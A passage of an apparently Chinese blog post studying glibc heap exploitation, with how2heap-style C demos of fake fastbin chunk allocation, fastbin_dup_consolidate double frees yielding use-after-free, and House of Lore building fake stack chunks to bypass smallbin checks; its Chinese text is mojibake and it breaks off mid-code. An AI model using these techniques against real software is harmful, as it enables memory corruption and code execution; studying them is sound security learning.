class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">void</span> *chunk1;</span><br><span class="line">    <span class="type">void</span> *chunk_a;</span><br><span class="line"></span><br><span class="line">    chunk1=<span class="built_in">malloc</span>(<span class="number">0x60</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(chunk1);</span><br><span class="line"></span><br><span class="line">    *(<span class="type">long</span> <span class="type">long</span> *)chunk1 = <span class="number">0x7f9b4c45baf5</span> - <span class="number">0x8</span>;</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x60</span>);</span><br><span class="line">    chunk_a=<span class="built_in">malloc</span>(<span class="number">0x60</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="fdæŒ‡é’ˆå¾—å‡º"><a href="#fdæŒ‡é’ˆå¾—å‡º" class="headerlink" title="fdæŒ‡é’ˆå¾—å‡º"></a>fdæŒ‡é’ˆå¾—å‡º</h3><figure class="highlight markdown"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//è¿™é‡Œçš„sizeæŒ‡ç”¨æˆ·åŒºåŸŸï¼Œå› æ­¤è¦å°2å€SIZE<span class="emphasis">_SZ</span></span><br><span class="line"><span class="emphasis">Fastbins[idx=0, size=0x10]</span></span><br><span class="line"><span class="emphasis">Fastbins[idx=1, size=0x20]</span></span><br><span class="line"><span class="emphasis">Fastbins[idx=2, size=0x30]</span></span><br><span class="line"><span class="emphasis">Fastbins[idx=3, size=0x40]</span></span><br><span class="line"><span class="emphasis">Fastbins[idx=4, size=0x50]</span></span><br><span class="line"><span class="emphasis">Fastbins[idx=5, size=0x60]</span></span><br><span class="line"><span class="emphasis">Fastbins[idx=6, size=0x70]</span></span><br></pre></td></tr></tbody></table></figure><h4 id="äººå·¥"><a href="#äººå·¥" class="headerlink" title="äººå·¥"></a>äººå·¥</h4><p><img src="/2024/07/15/heap-study/arbitrary_alloc_1.png"></p><p>å¯ä»¥çœ‹åˆ°0x7f9558141af5å¤„èƒ½é”™ä½å‡ºä¸€ä¸ª0x000000000000007fçš„sizeåŸŸï¼Œå¯ä»¥åœ¨æ­¤æ„é€ ä¸€ä¸ª0x70çš„fake_chunkï¼Œéœ€è¦malloc 0x60çš„chunk</p><h4 id="pwndbg"><a href="#pwndbg" class="headerlink" title="pwndbg"></a>pwndbg</h4><p><img src="/2024/07/15/heap-study/arbitrary_alloc_2.png"></p><p>åˆ©ç”¨pwndbgçš„find_fake_fastæŒ‡ä»¤ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯æƒ³è¦overlapçš„åœ°å€ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯å¤§å°(è¦åœ¨fastbinçš„èŒƒå›´å†…)</p><h1 id="fastbin-dup-consolidate"><a href="#fastbin-dup-consolidate" class="headerlink" title="fastbin_dup_consolidate"></a>fastbin_dup_consolidate</h1><h2 id="ç»•è¿‡tcacheå¯¹double-freeçš„æ£€æŸ¥ï¼ˆlatestï¼‰"><a href="#ç»•è¿‡tcacheå¯¹double-freeçš„æ£€æŸ¥ï¼ˆlatestï¼‰" class="headerlink" title="ç»•è¿‡tcacheå¯¹double freeçš„æ£€æŸ¥ï¼ˆlatestï¼‰"></a>ç»•è¿‡tcacheå¯¹double freeçš„æ£€æŸ¥ï¼ˆlatestï¼‰</h2><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> {</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"This technique will make use of malloc_consolidate and a double free to gain a UAF / duplication in the tcache.\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"It would also allow us to perform tcache poisoning.\n\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Lets fill up the tcache to force fastbin usage...\n\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *ptr[<span class="number">7</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++)</span><br><span class="line">ptr[i] = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++)</span><br><span class="line"><span class="built_in">free</span>(ptr[i]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// void* ppoison = malloc(0x400);</span></span><br><span class="line"><span class="comment">// ^ We would have to allocate this to be able to do tcache poison later, since we need at least 2 chunks in a bin to do it.</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span>* p1 = <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x40</span>);</span><br><span class="line"><span class="comment">// Using calloc here doesn't take from the tcache since calloc calls _int_malloc (https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L3679) </span></span><br><span class="line"><span class="comment">// and taking from the tcache is handled in __libc_malloc. If we used malloc(0x40) the chunk would get taken from the tcache.</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Allocate another chunk of the same size p1=%p \n"</span>, p1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Freeing p1 will add it to the fastbin.\n\n"</span>);</span><br><span class="line">  <span class="built_in">free</span>(p1);</span><br><span class="line"></span><br><span class="line">  <span class="type">void</span>* p3 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// free(ppoison);</span></span><br><span class="line"><span class="comment">// We can now free this chunk to put it in the tcache bin for the poison.</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"To trigger malloc_consolidate we need to allocate a chunk with large chunk size (&gt;= 0x400)\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"which corresponds to request size &gt;= 0x3f0. We will request 0x400 bytes, which will gives us\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"a tcache-sized chunk with chunk size 0x410. p3=%p\n"</span>, p3);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\nmalloc_consolidate will merge the fast chunk p1 with top.\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"p3 is allocated from top since there is no bin bigger than it. Thus, p1 = p3.\n"</span>);</span><br><span class="line"></span><br><span class="line">assert(p1 == p3);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"We will double free p1, which now points to the 0x410 chunk we just allocated (p3).\n\n"</span>);</span><br><span class="line"><span class="built_in">free</span>(p1); <span class="comment">// vulnerability</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"So p1 is double freed, and p3 hasn't been freed although it now points to a free chunk.\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"We have thus achieved UAF on tcache!\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// *(long long*)p3 = target;</span></span><br><span class="line"><span class="comment">// We can use the UAF here to perform tcache poison.</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"We will request a chunk of size 0x400, this will give us the 0x410 chunk thats currently in\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"the tcache bin. p3 and p1 will still be pointing to it.\n"</span>);</span><br><span class="line"><span class="type">void</span> *p4 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line"></span><br><span class="line">assert(p4 == p3);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"We now have two pointers (p3 and p4) that haven't been directly freed\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"and both point to the same tcache sized chunk. p3=%p p4=%p\n"</span>, p3, p4);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"We have achieved duplication!\n\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Note: This duplication would have also worked with a larger chunk size, the chunks would\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"have behaved the same, just being taken from the top instead of from the tcache bin."</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>å¡«å……å®Œtcacheåcallocä¸€ä¸ªç›¸åŒå¤§å°çš„chunkï¼Œfreeå®ƒåå°†ä¼šè¢«æ”¾å…¥fastbinä¸­<br><img src="/2024/07/15/heap-study/fastbin_dup_consolidate_1.png"><br>éšåmallocä¸€ä¸ª0x400çš„chunkè§¦å‘malloc_consolidateæ­¤æ—¶p1 = p3<br><img src="/2024/07/15/heap-study/fastbin_dup_consolidate_2.png"><br>æ­¤æ—¶å¯ä»¥å®ç°å¯¹p1çš„é‡é‡Šæ”¾</p><p>æ­¤æ—¶æˆ‘ä»¬å†mallocä¸€ä¸ª0x400çš„chunkå°±å¯ä»¥å®ç°å¯¹tcacheä¸Šçš„UAF(p3 = p4)<br><img src="/2024/07/15/heap-study/fastbin_dup_consolidate_3.png"><br><strong>æ³¨æ„ï¼šè¿™ç§å¤åˆ¶ä¹Ÿå¯ä»¥ç”¨äºæ›´å¤§çš„å—å¤§å°ï¼Œå—çš„è¡Œä¸ºç›¸åŒï¼Œåªæ˜¯ä» top è€Œä¸æ˜¯ä» tcache bin ä¸­å–å‡ºã€‚</strong></p><h2 id="ç»•è¿‡fastbin-å¯¹-double-free-çš„æ£€æŸ¥ï¼ˆglibc2-23ï¼‰"><a href="#ç»•è¿‡fastbin-å¯¹-double-free-çš„æ£€æŸ¥ï¼ˆglibc2-23ï¼‰" class="headerlink" title="ç»•è¿‡fastbin å¯¹ double free çš„æ£€æŸ¥ï¼ˆglibc2.23ï¼‰"></a>ç»•è¿‡fastbin å¯¹ double free çš„æ£€æŸ¥ï¼ˆglibc2.23ï¼‰</h2><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> {</span><br><span class="line">  <span class="type">void</span> *ptrs[<span class="number">8</span>];</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">8</span>; i++) {</span><br><span class="line">      ptrs[i] = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++) {</span><br><span class="line">      <span class="built_in">free</span>(ptrs[i]);</span><br><span class="line">  }</span><br><span class="line">  <span class="comment">//void* p1 = calloc(1,0x10);</span></span><br><span class="line">  <span class="type">void</span>* p1 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">  <span class="built_in">strcpy</span>(p1, <span class="string">"AAAAAAAA"</span>);</span><br><span class="line">  <span class="comment">//void* p2 = calloc(1,0x10);</span></span><br><span class="line">  <span class="type">void</span>* p2 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">  <span class="built_in">strcpy</span>(p2, <span class="string">"BBBBBBBB"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"ç”³è¯·ä¸¤ä¸ª fastbin èŒƒå›´å†…çš„ chunk: p1=%p p2=%p\n"</span>, p1, p2);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"å…ˆ free p1\n"</span>);</span><br><span class="line">  <span class="built_in">free</span>(p1);</span><br><span class="line">  <span class="type">void</span>* p3 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"å»ç”³è¯· largebin å¤§å°çš„ chunkï¼Œè§¦å‘ malloc_consolidate(): p3=%p\n"</span>, p3);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"å› ä¸º malloc_consolidate(), p1 ä¼šè¢«æ”¾åˆ° unsorted bin ä¸­\n"</span>);</span><br><span class="line">  <span class="built_in">free</span>(p1);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"è¿™æ—¶å€™ p1 ä¸åœ¨ fastbin é“¾è¡¨çš„å¤´éƒ¨äº†ï¼Œæ‰€ä»¥å¯ä»¥å†æ¬¡ free p1 é€ æˆ double free\n"</span>);</span><br><span class="line">  <span class="type">void</span>* p4 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">  <span class="built_in">strcpy</span>(p4, <span class="string">"CCCCCCC"</span>);</span><br><span class="line">  <span class="type">void</span>* p5 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">  <span class="built_in">strcpy</span>(p5, <span class="string">"DDDDDDDD"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"ç°åœ¨ fastbin å’Œ unsortedbin ä¸­éƒ½æ”¾ç€ p1 çš„æŒ‡é’ˆï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ malloc ä¸¤æ¬¡éƒ½åˆ° p1: %p %p\n"</span>, p4, p5);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>ä¸€å¼€å§‹calloc()ä¸¤ä¸ª0x10çš„chunk<br><img src="/2024/07/15/heap-study/fastbin_dup_consolidate_4.png"><br>å…ˆé‡Šæ”¾æ‰p1æ”¾åˆ°fastbinä¸­<br><img src="/2024/07/15/heap-study/fastbin_dup_consolidate_5.png"><br>æ­¤æ—¶mallocä¸€ä¸ª large chunk å³ï¼švoid *p3 = malloc(0x400); è§¦å‘malloc_consolidateå°†fastbinä¸­çš„chunkæ”¾å…¥åˆ°smallbinæˆ–è€…unstoredbin<br><img src="/2024/07/15/heap-study/fastbin_dup_consolidate_6.png"><br>æ­¤æ—¶p1å°±ä¸åœ¨fastbinä¸­é“¾è¡¨çš„å¤´éƒ¨äº†ï¼Œå°±å¯ä»¥è¢«å†æ¬¡free<br>é‚£ä¹ˆp1å°±æ—¢åœ¨fastbinå’Œsmallbinä¸­äº†<br><img src="/2024/07/15/heap-study/fastbin_dup_consolidate_7.png"><br>ç°åœ¨å†è¿›è¡Œä¸¤æ¬¡mallocé‚£ä¹ˆå°±éƒ½åˆ†é…åˆ°p1<br>æ­¤æ—¶å°±å®ç°äº†UAF  </p><h1 id="house-of-force-glibc2-31"><a href="#house-of-force-glibc2-31" class="headerlink" title="house_of_force(glibc2.31)"></a>house_of_force(glibc2.31)</h1><p><img src="/2024/07/15/heap-study/house_of_force.png"></p><h1 id="house-of-lore-glibc2-31"><a href="#house-of-lore-glibc2-31" class="headerlink" title="house_of_lore(glibc2.31)"></a>house_of_lore(glibc2.31)</h1><figure class="highlight markdown"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">House of Lore çš„ä½œç”¨ä¸»è¦æ˜¯åˆ©ç”¨ malloc å®ç°ä¸­çš„é€»è¾‘æ¼æ´ï¼Œåœ¨å †æº¢å‡ºæ”»å‡»ä¸­å®ç°ä»»æ„å†…å­˜å†™å…¥ã€‚æ”»å‡»è€…é€šè¿‡ç²¾å¿ƒæ„é€ çš„å †å—ä¼ªé€ å’Œæœªæ£€æŸ¥çš„åˆå¹¶æ“ä½œï¼Œå¯ä»¥æ¬ºéª— malloc è®¤ä¸ºä¸€ä¸ªä¼ªé€ çš„å—æ˜¯åˆæ³•çš„å †å—ï¼Œä»è€Œè¿›è¡Œä»»æ„å†…å­˜å†™å…¥ã€‚è¿™ç§æ”»å‡»æŠ€æœ¯å…è®¸æ”»å‡»è€…ä¿®æ”¹å…¨å±€å˜é‡ã€å‡½æ•°æŒ‡é’ˆç­‰å…³é”®æ•°æ®ï¼Œç”šè‡³å¯èƒ½å®ç°è¿œç¨‹ä»£ç æ‰§è¡Œï¼Œé€ æˆä¸¥é‡å®‰å…¨é—®é¢˜ã€‚</span><br></pre></td></tr></tbody></table></figure><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">jackpot</span><span class="params">()</span>{ <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Nice jump d00d\n"</span>); <span class="built_in">exit</span>(<span class="number">0</span>); }</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> * argv[])</span>{</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="type">intptr_t</span>* stack_buffer_1[<span class="number">4</span>] = {<span class="number">0</span>};</span><br><span class="line">  <span class="type">intptr_t</span>* stack_buffer_2[<span class="number">4</span>] = {<span class="number">0</span>};</span><br><span class="line">  <span class="type">void</span>* fake_freelist[<span class="number">7</span>][<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nWelcome to the House of Lore\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This is a revisited version that bypass also the hardening check introduced by glibc malloc\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This is tested against Ubuntu 20.04.2 - 64bit - glibc-2.31\n\n"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocating the victim chunk\n"</span>);</span><br><span class="line">  <span class="type">intptr_t</span> *victim = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocated the first small chunk on the heap at %p\n"</span>, victim);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocating dummy chunks for using up tcache later\n"</span>);</span><br><span class="line">  <span class="type">void</span> *dummies[<span class="number">7</span>];</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++) dummies[i] = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// victim-WORD_SIZE because we need to remove the header size in order to have the absolute address of the chunk</span></span><br><span class="line">  <span class="type">intptr_t</span> *victim_chunk = victim<span class="number">-2</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"stack_buffer_1 at %p\n"</span>, (<span class="type">void</span>*)stack_buffer_1);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"stack_buffer_2 at %p\n"</span>, (<span class="type">void</span>*)stack_buffer_2);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Create a fake free-list on the stack\n"</span>);</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">6</span>; i++) {</span><br><span class="line">    fake_freelist[i][<span class="number">3</span>] = fake_freelist[i+<span class="number">1</span>];</span><br><span class="line">  }</span><br><span class="line">  fake_freelist[<span class="number">6</span>][<span class="number">3</span>] = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"fake free-list at %p\n"</span>, fake_freelist);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Create a fake chunk on the stack\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corrupted"</span></span><br><span class="line">         <span class="string">"in second to the last malloc, which putting stack address on smallbin list\n"</span>);</span><br><span class="line">  stack_buffer_1[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  stack_buffer_1[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  stack_buffer_1[<span class="number">2</span>] = victim_chunk;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 "</span></span><br><span class="line">         <span class="string">"in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake "</span></span><br><span class="line">         <span class="string">"chunk on stack"</span>);</span><br><span class="line">  stack_buffer_1[<span class="number">3</span>] = (<span class="type">intptr_t</span>*)stack_buffer_2;</span><br><span class="line">  stack_buffer_2[<span class="number">2</span>] = (<span class="type">intptr_t</span>*)stack_buffer_1;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Set the bck pointer of stack_buffer_2 to the fake free-list in order to prevent crash prevent crash "</span></span><br><span class="line">          <span class="string">"introduced by smallbin-to-tcache mechanism\n"</span>);</span><br><span class="line">  stack_buffer_2[<span class="number">3</span>] = (<span class="type">intptr_t</span> *)fake_freelist[<span class="number">0</span>];</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocating another large chunk in order to avoid consolidating the top chunk with"</span></span><br><span class="line">         <span class="string">"the small one during the free()\n"</span>);</span><br><span class="line">  <span class="type">void</span> *p5 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocated the large chunk on the heap at %p\n"</span>, p5);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Freeing dummy chunk\n"</span>);</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++) <span class="built_in">free</span>(dummies[i]);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Freeing the chunk %p, it will be inserted in the unsorted bin\n"</span>, victim);</span><br><span class="line">  <span class="built_in">free</span>((<span class="type">void</span>*)victim);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nIn the unsorted bin the victim's fwd and bk pointers are the unsorted bin's header address (libc addresses)\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"victim-&gt;fwd: %p\n"</span>, (<span class="type">void</span> *)victim[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"victim-&gt;bk: %p\n\n"</span>, (<span class="type">void</span> *)victim[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now performing a malloc that can't be handled by the UnsortedBin, nor the small bin\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This means that the chunk %p will be inserted in front of the SmallBin\n"</span>, victim);</span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> 